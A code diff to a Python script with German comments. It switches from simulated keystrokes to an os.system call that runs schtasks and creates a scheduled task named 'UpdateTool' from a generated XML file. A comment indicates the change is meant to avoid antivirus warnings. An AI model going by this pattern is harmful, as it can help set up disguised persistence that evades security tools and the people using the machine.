@@ -128,6 +128,9 @@ print('xml datei geschrieben')
 
 time.sleep(0.5)
 
+os.system(r'cmd /c "schtasks /create /tn "UpdateTool" /xml ' + newpath_tmp + '\\' + xmlname + '"')
+# if os.system makes virus warning again
+'''
 #schtask aus xml erstellen
 
 # Ausführung öffnen
@@ -150,3 +153,4 @@ keyboard.type('exit')
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
 #print("fertig")
+'''
